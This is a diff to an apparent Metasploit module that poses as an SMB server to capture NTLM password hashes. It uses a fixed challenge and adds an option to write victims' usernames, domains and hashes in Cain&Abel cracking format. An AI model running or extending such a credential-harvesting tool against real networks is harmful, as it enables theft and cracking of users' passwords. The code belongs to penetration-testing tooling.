@@ -52,12 +52,14 @@ class Metasploit3 < Msf::Auxiliary
 		
 		register_options(
 			[
-				OptString.new('LOGFILE', [ true, "The local filename to store the captured hashes", "smb_sniffer.log" ])
+				OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
+				OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ])				
 			], self.class )		
 		
 	end
 
 	def run
+		@challenge = "\x11\x22\x33\x44\x55\x66\x77\x88"
 		exploit()
 	end
 
@@ -100,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
 		smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
 
 		# The hardcoded challenge value
-		challenge = "\x11\x22\x33\x44\x55\x66\x77\x88"
+		challenge = @challenge 
 
 		group    = ''
 		machine  = smb[:nbsrc]
@@ -221,22 +223,39 @@ class Metasploit3 < Msf::Auxiliary
 			:type  => "smb_domain",
 			:data  => smb[:domain]
 		) if (smb[:domain] and smb[:domain].strip.length > 0)
-						
-		fd = File.open(datastore['LOGFILE'], "a")
-		fd.puts(
-			[
-				smb[:nbsrc],
-				smb[:ip],
-				smb[:username] ? smb[:username] : "<NULL>",
-				smb[:domain] ? smb[:domain] : "<NULL>",
-				smb[:peer_os],
-				nt_hash ? nt_hash : "<NULL>",
-				lm_hash ? lm_hash : "<NULL>",
-				Time.now.to_s
-			].join(":").gsub(/\n/, "\\n")
-		)
-		fd.close
 		
+		
+		if(datastore['LOGFILE'])			
+			fd = File.open(datastore['LOGFILE'], "a")
+			fd.puts(
+				[
+					smb[:nbsrc],
+					smb[:ip],
+					smb[:username] ? smb[:username] : "<NULL>",
+					smb[:domain] ? smb[:domain] : "<NULL>",
+					smb[:peer_os],
+					nt_hash ? nt_hash : "<NULL>",
+					lm_hash ? lm_hash : "<NULL>",
+					Time.now.to_s
+				].join(":").gsub(/\n/, "\\n")
+			)
+			fd.close
+		end
+				
+		if(datastore['PWFILE'] and smb[:username] and lm_hash)
+			fd = File.open(datastore['PWFILE'], "a")
+			fd.puts(
+				[
+					smb[:username],
+					smb[:domain] ? smb[:domain] : "NULL",
+					@challenge.unpack("H*")[0],
+					lm_hash ? lm_hash : "0" * 32,
+					nt_hash ? nt_hash : "0" * 32
+				].join(":").gsub(/\n/, "\\n")
+			)
+			fd.close		
+		
+		end
 		
 		pkt = CONST::SMB_BASE_PKT.make_struct
 		smb_set_defaults(c, pkt)
